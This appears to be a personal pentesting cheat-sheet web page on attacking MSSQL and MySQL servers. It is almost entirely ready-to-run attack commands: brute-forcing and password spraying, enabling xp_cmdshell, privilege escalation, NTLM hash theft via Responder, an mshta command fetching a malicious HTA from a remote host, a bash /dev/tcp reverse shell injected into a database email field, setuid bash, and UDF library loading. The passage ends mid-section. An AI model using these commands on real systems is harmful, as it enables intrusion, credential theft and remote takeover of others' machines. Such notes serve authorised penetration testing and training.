<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Pentesting Databases</title>
  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
  <link rel="stylesheet" href="/assets/css/style.css">
  <!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Pentesting Databases | Vault-Tec Terminal</title>
<meta name="generator" content="Jekyll v4.3.4" />
<meta property="og:title" content="Pentesting Databases" />
<meta name="author" content="RedTeamer403" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="RedTeamer403 Security Portfolio" />
<meta property="og:description" content="RedTeamer403 Security Portfolio" />
<link rel="canonical" href="http://localhost:4000/notes/tech/db/" />
<meta property="og:url" content="http://localhost:4000/notes/tech/db/" />
<meta property="og:site_name" content="Vault-Tec Terminal" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Pentesting Databases" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"WebPage","author":{"@type":"Person","name":"RedTeamer403"},"description":"RedTeamer403 Security Portfolio","headline":"Pentesting Databases","url":"http://localhost:4000/notes/tech/db/"}</script>
<!-- End Jekyll SEO tag -->

</head>
<body>
  <div id="init-screen" class="init-screen">
    <div class="init-content">
      <div class="init-step">Initializing VAULT-TEC OS...</div>
      <div class="init-step">Loading security protocols...</div>
      <div class="init-step">Establishing secure connection...</div>
      <div class="init-step">Connection established.</div>
      <div class="init-step">SYSTEM READY</div>
    </div>
  </div>

  <div id="main-content" class="main-content hidden">
    <header>
      <div class="container">
        <h1>Vault-Tec Terminal</h1>
        <nav>
          <a href="/" >ABOUT</a>
          <a href="/posts" >POSTS</a>
          <a href="/notes" class="active">NOTES</a>
          <a href="/tools" >TOOLS</a>
        </nav>
      </div>
    </header>

    <main class="container">
      <div class="search-container">
        <input type="text" class="search-input" placeholder="Search notes...">
      </div>
      <div class="notes-container">
        <div class="notes-sidebar">
          <div class="notes-category">
            <h3>CheatSheets</h3>
            <div class="notes-subcategory">
              <a href="/notes/cheat/curl/" >CURL</a>
              <a href="/notes/cheat/DNS/" >DNS</a>
              <a href="/notes/cheat/file/" >File Transfer</a>
              <a href="/notes/cheat/hydra/" >Hydra</a>
              <a href="/notes/cheat/impacket/" >Impacket</a>
              <a href="/notes/cheat/john/" >JohnTheRipper</a>
              <a href="/notes/cheat/ncat/" >NCAT</a>
              <a href="/notes/cheat/nmap/" >NMAP</a>
              <a href="/notes/cheat/useful/" >Online Resources</a>
              <a href="/notes/cheat/shell/" >Reverse Shell</a>
              <a href="/notes/cheat/wordlists/" >Wordlists</a>
            </div>
          </div>

          <div class="notes-category">
            <h3>Active Directory</h3>
            <div class="notes-subcategory">
              <a href="/notes/ad/enum/" >Domain Enumeration</a>
              <a href="/notes/ad/attack/" >Attack Vectors</a>
              <a href="/notes/ad/persist/" >Persistence</a>
              <a href="/notes/ad/lateral/" >Lateral Movement</a>
            </div>
          </div>
          
          <div class="notes-category">
            <h3>Cloud</h3>
            <div class="notes-subcategory">
              <a href="/notes/cloud/aws/" >AWS</a>
              <a href="/notes/cloud/azure/" >Azure</a>
              <a href="/notes/cloud/google/" >Google</a>
              <a href="/notes/cloud/terra/" >Terraform</a>
            </div>
          </div>

          <div class="notes-category">
            <h3>Container</h3>
            <div class="notes-subcategory">
              <a href="/notes/container/docker/" >Docker</a>
              <a href="/notes/container/k8s/" >Kubernetes</a>
            </div>
          </div>

          <div class="notes-category">
            <h3>Linux</h3>
            <div class="notes-subcategory">
              <a href="/notes/linux/checklist/" >Penetration Testing Checklist</a>
              <a href="/notes/linux/enum/" >Enumeration</a>
              <a href="/notes/linux/privesc/" >Privilege Escalation</a>
              <a href="/notes/linux/post/" >Post Exploitation</a>
              <a href="/notes/linux/services/" >Services</a>
              <a href="/notes/linux/tools/" >Tools</a>
            </div>
          </div>

          <div class="notes-category">
            <h3>Network</h3>
            <div class="notes-subcategory">
              <a href="/notes/network/exfil/" >Data Exfiltration</a>
              <a href="/notes/network/scan/" >Port Scanning</a>
              <a href="/notes/network/recon/" >Reconnaissance</a>
              <a href="/notes/network/pivot/" >Pivoting</a>
              <a href="/notes/network/services/" >Services</a>
              <a href="/notes/network/sniff/" >Traffic Analysis</a>
            </div>
          </div>

          <div class="notes-category">
            <h3>Tech Stack</h3>
            <div class="notes-subcategory">
              <a href="/notes/tech/cms/" >CMS</a>
              <a href="/notes/tech/db/" class="active">Databases</a>
              <a href="/notes/tech/devops/" >DevOps</a>
              <a href="/notes/tech/enterprise/" >Enterprise Apps</a>
              <a href="/notes/tech/iam/" >IAM</a>
              <a href="/notes/tech/mon/" >Monitoring</a>
              <a href="/notes/tech/open/" >Open-Source</a>
              <a href="/notes/tech/util/" >Utilities</a>
              <a href="/notes/tech/server/" >Web Servers</a>
            </div>
          </div>

          <div class="notes-category">
            <h3>Windows</h3>
            <div class="notes-subcategory">
              <a href="/notes/windows/av/" >AV/EDR Evasion</a>
              <a href="/notes/windows/enum/" >Enumeration</a>
              <a href="/notes/windows/privesc/" >Privilege Escalation</a>
              <a href="/notes/windows/post/" >Post Exploitation</a>
            </div>
          </div>

          <div class="notes-category">
            <h3>Web Application</h3>
            <div class="notes-subcategory">
              <a href="/notes/web/recon/" >Reconnaissance</a>
              <a href="/notes/web/vulns/" >Common Vulnerabilities</a>
              <a href="/notes/web/auth/" >Authentication Bypass</a>
              <a href="/notes/web/api/" >API Testing</a>
            </div>
          </div>
        </div>

        <div class="notes-content">
          <div id="search-results"></div>
          <div id="note-content">
            <h1 id="pentesting-databases">Pentesting Databases</h1>

<!----------------------------------------------------------MSSQL---------------------------------------------------------------->

<details>
  <summary>MSSQL (1433)</summary>
  <p></p>

  <h2 id="enumeration">Enumeration</h2>
  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">--script</span> ms-sql-info <span class="nt">-p</span> 1433 &lt;target-ip&gt;
nmap <span class="nt">--script</span> ms-sql-config <span class="nt">-p</span> 1433 &lt;target-ip&gt;
nmap <span class="nt">--script</span> ms-sql-empty-password,ms-sql-xp-cmdshell <span class="nt">-p</span> 1433 &lt;target-ip&gt;
nmap <span class="nt">--script</span> ms-sql-<span class="k">*</span> <span class="nt">-p</span> 1433 &lt;target-ip&gt;

<span class="c"># MSDAT: https://github.com/quentinhardy/msdat</span>
<span class="c"># all: Enumerate with all modules</span>
python3 msdat.py all <span class="nt">-s</span> example.com
<span class="c"># -D, -U, -P: Use Windows authentication</span>
python3 msdat.py all <span class="nt">-s</span> example.com <span class="nt">-D</span> domain <span class="nt">-U</span> username <span class="nt">-P</span> password
<span class="c"># xpdirectory: List directories in system</span>
python3 msdat.py xpdirectory <span class="nt">-s</span> manager.htb <span class="nt">-D</span> manager <span class="nt">-U</span> operator <span class="nt">-P</span> operator <span class="nt">-d</span> master <span class="nt">--list-files</span> <span class="s1">'C:\'</span>
<span class="c"># bulkopen: Read/download files</span>
python3 msdat.py bulkopen <span class="nt">-s</span> example.com <span class="nt">-D</span> domain <span class="nt">-U</span> username <span class="nt">-P</span> password <span class="nt">-d</span> database <span class="nt">--read-file</span> <span class="s1">'C:\Users\Administrator\Desktop\example.txt'</span>

<span class="c"># Metasploit</span>
msfconsole
msf&gt; use admin/mssql/mssql_enum
msf&gt; use admin/mssql/mssql_enum_domain_accounts
msf&gt; use admin/mssql/mssql_enum_sql_logins
msf&gt; use auxiliary/admin/mssql/mssql_findandsampledata
msf&gt; use auxiliary/admin/mssql/mssql_idf
msf&gt; use auxiliary/scanner/mssql/mssql_hashdump
msf&gt; use auxiliary/scanner/mssql/mssql_schemadump
</code></pre></div>  </div>

  <h2 id="bruteforce">Bruteforce</h2>
  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># netexec</span>
netexec mssql &lt;target-ip&gt; <span class="nt">-u</span> username <span class="nt">-p</span> passwords.txt

<span class="c">#hydra</span>
hydra <span class="nt">-L</span> usernames.txt –p password &lt;target-ip&gt; mssql
hydra <span class="nt">-l</span> username –P passwords.txt &lt;target-ip&gt; mssql

<span class="c"># Password Spraying</span>
netexec mssql example.com <span class="nt">-u</span> usernames.txt <span class="nt">-p</span> <span class="s1">'HelloWorld!'</span> <span class="nt">--no-bruteforce</span> <span class="nt">--continue-on-success</span>
</code></pre></div>  </div>

  <h2 id="connect">Connect</h2>
  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># impacket</span>
impacket-mssqlclient <span class="nt">-port</span> 1433 DOMAIN/username:password@&lt;target-ip&gt;
impacket-mssqlclient <span class="nt">-port</span> 1433 DOMAIN/username:password@&lt;target-ip&gt; <span class="nt">-windows-auth</span>

<span class="c"># sqsh</span>
sqsh <span class="nt">-S</span> &lt;target-ip&gt; <span class="nt">-U</span> username <span class="nt">-P</span> password
sqsh <span class="nt">-S</span> &lt;target-ip&gt; <span class="nt">-U</span> username <span class="nt">-P</span> password <span class="nt">-D</span> database
</code></pre></div>  </div>

  <h2 id="commands">Commands</h2>
  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Get the version of MSSQL</span>
SELECT @@version
<span class="c"># Get current username</span>
SELECT user_name<span class="o">()</span>
<span class="c"># Get all users</span>
SELECT <span class="k">*</span> FROM sys.database_principals
<span class="c"># Filter users's result</span>
<span class="k">select </span>name,
       create_date,
       modify_date,
       type_desc as <span class="nb">type</span>,
       authentication_type_desc as authentication_type,
       sid
from sys.database_principals
where <span class="nb">type </span>not <span class="k">in</span> <span class="o">(</span><span class="s1">'A'</span>, <span class="s1">'R'</span><span class="o">)</span>
order by name<span class="p">;</span>
<span class="c"># Get databases</span>
SELECT <span class="k">*</span> FROM master.dbo.sysdatabases
<span class="c"># Switch to the database</span>
USE &lt;database&gt;
<span class="c"># List tables</span>
SELECT <span class="k">*</span> FROM information_schema.tables
<span class="c"># Get table content</span>
SELECT <span class="k">*</span> FROM &lt;database_name&gt;.dbo.&lt;table_name&gt;
<span class="c"># Check if xp_cmdshell is enabled</span>
SELECT <span class="k">*</span> FROM sys.configurations WHERE name <span class="o">=</span> <span class="s1">'xp_cmdshell'</span><span class="p">;</span>
<span class="c"># Check if the current user have permission to execute OS command</span>
USE master
EXEC sp_helprotect <span class="s1">'xp_cmdshell'</span>
<span class="c"># Get linked servers</span>
EXEC sp_linkedservers
SELECT <span class="k">*</span> FROM sys.servers
<span class="c"># Create a new user with sysadmin privilege</span>
CREATE LOGIN tester WITH PASSWORD <span class="o">=</span> <span class="s1">'password'</span>
EXEC sp_addsrvrolemember <span class="s1">'tester'</span>, <span class="s1">'sysadmin'</span>
<span class="c"># List directories</span>
xp_dirtree <span class="s1">'.\'</span>
xp_dirtree <span class="s1">'C:\inetpub\'</span>
xp_dirtree <span class="s1">'C:\inetpub\wwwroot\'</span>
xp_dirtree <span class="s1">'C:\Users\'</span>
<span class="c"># Get hashed passwords</span>
SELECT <span class="k">*</span> FROM master.sys.syslogins<span class="p">;</span>
</code></pre></div>  </div>

  <h2 id="privilege-escalation">Privilege Escalation</h2>
  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># ---------Impersonation---------</span>
<span class="c"># Assume that the 'sa' user can be impersonated.</span>
EXECUTE AS <span class="s1">'sa'</span>
EXEC xp_cmdshell <span class="s1">'whoami'</span>

<span class="c"># ---------XP_CMDSHELL---------</span>
<span class="c"># Enable/Disable Windows Shell</span>
<span class="o">&gt;</span> enable_xp_cmdshell
<span class="o">&gt;</span> disable_xp_cmdshell
<span class="c"># or</span>
<span class="c"># Enable advanced options</span>
<span class="o">&gt;</span> EXEC sp_configure <span class="s1">'show advanced options'</span>, 1<span class="p">;</span>
<span class="c"># Update the currently configured value for the advanced options</span>
<span class="o">&gt;</span> RECONFIGURE<span class="p">;</span>
<span class="c"># Enable the command shell</span>
<span class="o">&gt;</span> EXEC sp_configure <span class="s1">'xp_cmdshell'</span>, 1<span class="p">;</span>
<span class="c"># Update the currently configured value for the command shell</span>
<span class="o">&gt;</span> RECONFIGURE<span class="p">;</span>
<span class="c"># Execute commands</span>
<span class="o">&gt;</span> xp_cmdshell <span class="nb">whoami</span>
<span class="c"># Execute obfuscated commands.</span>
<span class="o">&gt;</span> xp_cmdshell <span class="s1">'powershell -e &lt;BASE64_PAYLOAD&gt;'</span>

<span class="c"># ---------Metasploit---------</span>
use exploit/windows/mssql/mssql_linkcrawler
<span class="c">#If the user has IMPERSONATION privilege, this will try to escalate</span>
use admin/mssql/mssql_escalate_execute_as
<span class="c">#Escalate from db_owner to sysadmin</span>
use admin/mssql/mssql_escalate_dbowner
<span class="c">#Code execution</span>
<span class="c">#Execute commands</span>
use admin/mssql/mssql_exec 
<span class="c">#Uploads and execute a payload</span>
use exploit/windows/mssql/mssql_payload 
<span class="c">#Add new admin user from meterpreter session</span>
msf&gt; use windows/manage/mssql_local_auth_bypass

<span class="c"># ---------PowerShell scripts---------</span>
<span class="c"># https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-Dbowner.psm1</span>
Import-Module .Invoke-SqlServerDbElevateDbOwner.psm1
Invoke-SqlServerDbElevateDbOwner <span class="nt">-SqlUser</span> myappuser <span class="nt">-SqlPass</span> MyPassword! <span class="nt">-SqlServerInstance</span> 10.2.2.184
<span class="c"># https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-ExecuteAs.psm1</span>
Import-Module .Invoke-SqlServer-Escalate-ExecuteAs.psm1
Invoke-SqlServer-Escalate-ExecuteAs <span class="nt">-SqlServerInstance</span> 10.2.9.101 <span class="nt">-SqlUser</span> myuser1 <span class="nt">-SqlPass</span> MyPassword!
</code></pre></div>  </div>

  <h2 id="dump-ntlm-hash">Dump NTLM Hash</h2>
  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># 1. Start SMB Server and Responder</span>
<span class="c"># In terminal 1</span>
<span class="nb">sudo </span>responder <span class="nt">-I</span> &lt;interface&gt;
<span class="c"># In terminal 2</span>
<span class="nb">sudo </span>impacket-smbserver share ./ <span class="nt">-smb2support</span>

<span class="c"># 2. Execute with Metasploit</span>
<span class="c"># In terminal 3</span>
msf&gt; use auxiliary/admin/mssql/mssql_ntlm_stealer
<span class="nb">set </span>rhosts &lt;target_ip&gt;
<span class="nb">set </span>username &lt;username&gt;
<span class="nb">set </span>password &lt;password&gt;
<span class="c"># If we use Windows credential, set as below:</span>
<span class="nb">set </span>use_windows_authent <span class="nb">true
set </span>smbproxy &lt;responder_ip&gt;
run
</code></pre></div>  </div>

  <h2 id="tools">Tools</h2>
  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># ---------MSSqlPwner https://github.com/ScorpionesLabs/MSSqlPwner ---------</span>
<span class="c"># Bruteforce using tickets, hashes, and passwords against the hosts listed on the hosts.txt</span>
mssqlpwner hosts.txt brute <span class="nt">-tl</span> tickets.txt <span class="nt">-ul</span> users.txt <span class="nt">-hl</span> hashes.txt <span class="nt">-pl</span> passwords.txt
<span class="c"># Bruteforce using hashes, and passwords against the hosts listed on the hosts.txt</span>
mssqlpwner hosts.txt brute <span class="nt">-ul</span> users.txt <span class="nt">-hl</span> hashes.txt <span class="nt">-pl</span> passwords.txt
<span class="c"># Bruteforce using tickets against the hosts listed on the hosts.txt</span>
mssqlpwner hosts.txt brute <span class="nt">-tl</span> tickets.txt <span class="nt">-ul</span> users.txt
<span class="c"># Bruteforce using passwords against the hosts listed on the hosts.txt</span>
mssqlpwner hosts.txt brute <span class="nt">-ul</span> users.txt <span class="nt">-pl</span> passwords.txt
<span class="c"># Bruteforce using hashes against the hosts listed on the hosts.txt</span>
mssqlpwner hosts.txt brute <span class="nt">-ul</span> users.txt <span class="nt">-hl</span> hashes.txt
<span class="c"># Executing custom assembly on the current server with windows authentication and executing hostname command</span>
mssqlpwner corp.com/user:lab@192.168.1.65 <span class="nt">-windows-auth</span> custom-asm <span class="nb">hostname</span>
<span class="c"># Executing custom assembly on the current server with windows authentication and executing hostname command on the SRV01 linked server</span>
mssqlpwner corp.com/user:lab@192.168.1.65 <span class="nt">-windows-auth</span> <span class="nt">-link-name</span> SRV01 custom-asm <span class="nb">hostname</span>
<span class="c"># Executing the hostname command using stored procedures on the linked SRV01 server</span>
mssqlpwner corp.com/user:lab@192.168.1.65 <span class="nt">-windows-auth</span> <span class="nt">-link-name</span> SRV01 <span class="nb">exec hostname</span>
<span class="c"># Executing the hostname command using stored procedures on the linked SRV01 server with sp_oacreate method</span>
mssqlpwner corp.com/user:lab@192.168.1.65 <span class="nt">-windows-auth</span> <span class="nt">-link-name</span> SRV01 <span class="nb">exec</span> <span class="s2">"cmd /c mshta http://192.168.45.250/malicious.hta"</span> <span class="nt">-command-execution-method</span> sp_oacreate
<span class="c"># Issuing NTLM relay attack on the SRV01 server</span>
mssqlpwner corp.com/user:lab@192.168.1.65 <span class="nt">-windows-auth</span> <span class="nt">-link-name</span> SRV01 ntlm-relay 192.168.45.250
<span class="c"># Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25</span>
mssqlpwner corp.com/user:lab@192.168.1.65 <span class="nt">-windows-auth</span> <span class="nt">-chain-id</span> 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250
<span class="c"># Issuing NTLM relay attack on the local server with custom command</span>
mssqlpwner corp.com/user:lab@192.168.1.65 <span class="nt">-windows-auth</span> ntlm-relay 192.168.45.250

<span class="c"># ---------Impacket-mssqlclient---------</span>
<span class="c"># Using Impacket mssqlclient.py</span>
mssqlclient.py <span class="o">[</span><span class="nt">-db</span> volume] &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;
<span class="c">## Recommended -windows-auth when you are going to use a domain. Use as domain the netBIOS name of the machine</span>
mssqlclient.py <span class="o">[</span><span class="nt">-db</span> volume] <span class="nt">-windows-auth</span> &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;
<span class="c"># Using sqsh</span>
sqsh <span class="nt">-S</span> &lt;IP&gt; <span class="nt">-U</span> &lt;Username&gt; <span class="nt">-P</span> &lt;Password&gt; <span class="nt">-D</span> &lt;Database&gt;
<span class="c">## In case Windows Auth using "." as domain name for local user</span>
sqsh <span class="nt">-S</span> &lt;IP&gt; <span class="nt">-U</span> .<span class="se">\\</span>&lt;Username&gt; <span class="nt">-P</span> &lt;Password&gt; <span class="nt">-D</span> &lt;Database&gt;
<span class="c">## In sqsh you need to use GO after writting the query to send it</span>
1&gt; <span class="k">select </span>1<span class="p">;</span>
2&gt; go

<span class="c"># ---------crackmapexec---------</span>
<span class="c"># Username + Password + CMD command</span>
crackmapexec mssql <span class="nt">-d</span> &lt;Domain name&gt; <span class="nt">-u</span> &lt;username&gt; <span class="nt">-p</span> &lt;password&gt; <span class="nt">-x</span> <span class="s2">"whoami"</span>
<span class="c"># Username + Hash + PS command</span>
crackmapexec mssql <span class="nt">-d</span> &lt;Domain name&gt; <span class="nt">-u</span> &lt;username&gt; <span class="nt">-H</span> &lt;HASH&gt; <span class="nt">-X</span> <span class="s1">'$PSVersionTable'</span>
</code></pre></div>  </div>

</details>

<!----------------------------------------------------------MYSQL---------------------------------------------------------------->

<details>
  <summary>MySQL (3306)</summary>
  <p></p>

  <h2 id="enumeration-1">Enumeration</h2>
  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Nmap</span>
nmap <span class="nt">--script</span> mysql-info <span class="nt">-p</span> 3306 &lt;target-ip&gt;
nmap <span class="nt">--script</span> mysql-enum <span class="nt">-p</span> 3306 &lt;target-ip&gt;
nmap <span class="nt">--script</span> mysql-brute <span class="nt">-p</span> 3306 &lt;target-ip&gt;
nmap <span class="nt">--script</span> mysql-databases <span class="nt">-p</span> 3306 &lt;target-ip&gt;
nmap <span class="nt">--script</span> mysql-users <span class="nt">-p</span> 3306 &lt;target-ip&gt;
nmap <span class="nt">--script</span> mysql-<span class="k">*</span> <span class="nt">-p</span> 3306 &lt;target-ip&gt;

<span class="c"># Metasploit</span>
use auxiliary/scanner/mysql/mysql_version
use auxiliary/scanner/mysql/mysql_authbypass_hashdump
use auxiliary/scanner/mysql/mysql_hashdump <span class="c">#Creds</span>
use auxiliary/admin/mysql/mysql_enum <span class="c">#Creds</span>
use auxiliary/scanner/mysql/mysql_schemadump <span class="c">#Creds</span>
use exploit/windows/mysql/mysql_start_up <span class="c">#Execute commands Windows, Creds</span>
</code></pre></div>  </div>

  <h2 id="bruteforce-1">Bruteforce</h2>
  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra <span class="nt">-l</span> username <span class="nt">-P</span> passwords.txt &lt;target-ip&gt; mysql
hydra <span class="nt">-L</span> usernames.txt <span class="nt">-p</span> password &lt;target-ip&gt; mysql
</code></pre></div>  </div>

  <h2 id="config-files">Config files</h2>
  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Windows</span>
config.ini
windows<span class="se">\m</span>y.ini
winnt<span class="se">\m</span>y.ini
&lt;InstDir&gt;/mysql/data/

<span class="c"># unix</span>
<span class="nb">cat</span> /etc/mysql/my.cnf
<span class="nb">cat</span> /etc/mysql/mysql.conf.d/mysqld.cnf
<span class="nb">cat</span> /etc/mysql/debian.cnf
<span class="nb">cat</span> /etc/my.cnf
<span class="nb">cat</span> /var/lib/mysql/my.cnf
<span class="nb">cat</span> ~/.my.cnf

<span class="c">#Command History</span>
~/.mysql.history

<span class="c">#Log Files</span>
connections.log
update.log
common.log
</code></pre></div>  </div>

  <h2 id="commands-1">Commands</h2>
  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># ---------Connect Local---------</span>
<span class="c"># No password</span>
mysql <span class="nt">-u</span> username
<span class="c"># With Password</span>
mysql <span class="nt">-u</span> username <span class="nt">-p</span>
<span class="c"># Specity database name</span>
mysql <span class="nt">-u</span> username <span class="nt">-p</span> database_name

<span class="c"># ---------Connect Remote---------</span>
mysql <span class="nt">-u</span> username <span class="nt">-p</span> <span class="nt">-h</span> &lt;target-ip&gt; <span class="nt">-P</span> 3306
<span class="c"># Without password (remove -p)</span>
mysql <span class="nt">-u</span> username <span class="nt">-h</span> &lt;target-ip&gt; <span class="nt">-P</span> 3306
<span class="c"># Specify database (-D)</span>
mysql <span class="nt">-u</span> username <span class="nt">-p</span> <span class="nt">-h</span> &lt;target-ip&gt; <span class="nt">-D</span> database_name
<span class="c"># Default credential (username: root, no password)</span>
mysql <span class="nt">-u</span> root <span class="nt">-h</span> &lt;target-ip&gt; <span class="nt">-P</span> 3306

<span class="c"># ---------Basic commands---------</span>
show databases<span class="p">;</span>
<span class="c"># Display databases</span>
show databases<span class="p">;</span>
<span class="c"># Display tables in the current database</span>
show tables<span class="p">;</span>
<span class="c"># Display tables names</span>
<span class="k">select</span> <span class="k">*</span> from tablename<span class="p">;</span>
describe tablename<span class="p">;</span>
<span class="c"># List mysql users</span>
<span class="k">select </span>user from mysql.user<span class="p">;</span>
<span class="c"># List privileges of each user</span>
<span class="k">select </span>user,select_priv,insert_priv,update_priv,delete_priv,create_priv from mysql.user<span class="p">;</span>
<span class="c"># Switch to the database</span>
use db_name<span class="p">;</span>
<span class="c"># Display tables and table type</span>
show full tables<span class="p">;</span>
<span class="c"># Display tables in the database</span>
show tables from &lt;database&gt;<span class="p">;</span>
<span class="c"># Display tables which names start with 'user'</span>
show tables like <span class="s1">'user%'</span><span class="p">;</span>
<span class="c"># Display tables which names start with 'user' in the database</span>
show tables from &lt;database&gt; like <span class="s1">'user%'</span><span class="p">;</span>
<span class="c"># Display columns in a given table</span>
show columns from &lt;table&gt;<span class="p">;</span>
<span class="c"># Display everything in the table</span>
<span class="k">select</span> <span class="k">*</span> from &lt;table&gt;<span class="p">;</span>
<span class="c"># Create new table</span>
create table table_name<span class="o">(</span>column_name column_type<span class="o">)</span><span class="p">;</span>
create table table_name<span class="o">(</span>user_id int, user_name varchar<span class="o">(</span>40<span class="o">))</span><span class="p">;</span>
<span class="c"># Create an user-defined function</span>
create <span class="k">function </span>func_name<span class="o">(</span>param1, param2<span class="o">)</span> returns datatype<span class="p">;</span>
create <span class="k">function </span>new_fund<span class="o">(</span>age integer<span class="o">)</span> returns integer<span class="p">;</span>
<span class="c"># Use a function</span>
<span class="k">select </span>func_name<span class="o">(</span>param1, param2<span class="o">)</span><span class="p">;</span>
<span class="c"># Insert new record to a given table</span>
insert into &lt;table&gt; values<span class="o">(</span>value1, value2<span class="o">)</span><span class="p">;</span>
<span class="c"># Update data in a given table</span>
update &lt;table&gt; <span class="nb">set</span> &lt;column&gt;<span class="o">=</span><span class="s1">'&lt;value&gt;'</span><span class="p">;</span>
update &lt;table&gt; <span class="nb">set</span> &lt;column1&gt;<span class="o">=</span><span class="s1">'&lt;value1&gt;'</span>,&lt;column2&gt;<span class="o">=</span><span class="s1">'&lt;value2&gt;'</span><span class="p">;</span> <span class="c"># e.g. update users set role='admin' where username='john';</span>
<span class="c"># Delete a record</span>
delete from &lt;table&gt; where &lt;column&gt; <span class="o">=</span> &lt;value&gt;<span class="p">;</span> <span class="c"># e.g. delete from users where id = 2;</span>
</code></pre></div>  </div>

  <h2 id="read-and-execute-commands">Read and Execute commands</h2>
  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Read files</span>
<span class="k">select </span>load_file<span class="o">(</span><span class="s2">"/etc/passwd"</span><span class="o">)</span><span class="p">;</span>

<span class="c"># Run system commands</span>
<span class="k">select </span>sys_eval<span class="o">(</span><span class="s2">"whoami"</span><span class="o">)</span><span class="p">;</span>
<span class="k">select </span>sys_eval<span class="o">(</span><span class="s2">"chmod u+s /bin/bash"</span><span class="o">)</span><span class="p">;</span>
system <span class="nb">whoami
</span>system bash

<span class="c"># Execute command from source</span>
<span class="nb">source </span>example.sql

<span class="c"># Load data local into a table</span>
load data <span class="nb">local </span>infile <span class="s2">"/etc/passwd"</span> into table <span class="nb">test </span>FIELDS TERMINATED BY <span class="s1">'\n'</span><span class="p">;</span>
</code></pre></div>  </div>

  <h2 id="command-injection---reverse-shell">Command Injection -&gt; Reverse Shell</h2>
  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Update existing user email to execute reverse shell</span>
update exampledb.users SET <span class="nv">email</span><span class="o">=</span><span class="s1">'admin@shell|| bash -c "bash -i &gt;&amp; /dev/tcp/10.0.0.1/1234 0&gt;&amp;1" &amp;'</span> where name like <span class="s1">'admin%'</span><span class="p">;</span>
</code></pre></div>  </div>

  <h2 id="privilege-escalation-1">Privilege Escalation</h2>
  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Check mysql running as root?</span>
<span class="nb">cat</span> /etc/mysql/mysql.conf.d/mysqld.cnf | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"#"</span> | <span class="nb">grep</span> <span class="s2">"user"</span>
systemctl status mysql 2&gt;/dev/null | <span class="nb">grep</span> <span class="nt">-o</span> <span class="s2">".</span><span class="se">\{</span><span class="s2">0,0</span><span class="se">\}</span><span class="s2">user.</span><span class="se">\{</span><span class="s2">0,50</span><span class="se">\}</span><span class="s2">"</span> | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s1">'='</span> <span class="nt">-f2</span> | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s1">' '</span> <span class="nt">-f1</span>

<span class="c"># Get current user (an all users) privileges and hashes</span>
use mysql<span class="p">;</span>
<span class="k">select </span>user<span class="o">()</span><span class="p">;</span>
<span class="k">select </span>user,password,create_priv,insert_priv,update_priv,alter_priv,delete_priv,drop_priv from user<span class="p">;</span>

<span class="c"># Get users, permissions &amp; creds</span>
SELECT <span class="k">*</span> FROM mysql.user<span class="p">;</span>
mysql <span class="nt">-u</span> root <span class="nt">--password</span><span class="o">=</span>&lt;PASSWORD&gt; <span class="nt">-e</span> <span class="s2">"SELECT * FROM mysql.user;"</span>

<span class="c"># Create user and give privileges</span>
create user <span class="nb">test </span>identified by <span class="s1">'test'</span><span class="p">;</span>
grant SELECT,CREATE,DROP,UPDATE,DELETE,INSERT on <span class="k">*</span>.<span class="k">*</span> to mysql identified by <span class="s1">'mysql'</span> WITH GRANT OPTION<span class="p">;</span>

<span class="c"># Get a shell (with your permissions, usefull for sudo/suid privesc)</span>
<span class="se">\!</span> sh

<span class="c"># Extract hashes of the MySQL Users</span>
<span class="nb">grep</span> <span class="nt">-oaE</span> <span class="s2">"[-_</span><span class="se">\.\*</span><span class="s2">a-Z0-9]{3,}"</span> /var/lib/mysql/mysql/user.MYD | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"mysql_native_password"</span>

<span class="c"># ---------Linux PrivEsc---------</span>
<span class="c"># Use a database</span>
use mysql<span class="p">;</span>
<span class="c"># Create a table to load the library and move it to the plugins dir</span>
create table npn<span class="o">(</span>line blob<span class="o">)</span><span class="p">;</span>
<span class="c"># Load the binary library inside the table</span>
<span class="c">## You might need to change the path and file name</span>
insert into npn values<span class="o">(</span>load_file<span class="o">(</span><span class="s1">'/tmp/lib_mysqludf_sys.so'</span><span class="o">))</span><span class="p">;</span>
<span class="c"># Get the plugin_dir path</span>
show variables like <span class="s1">'%plugin%'</span><span class="p">;</span>
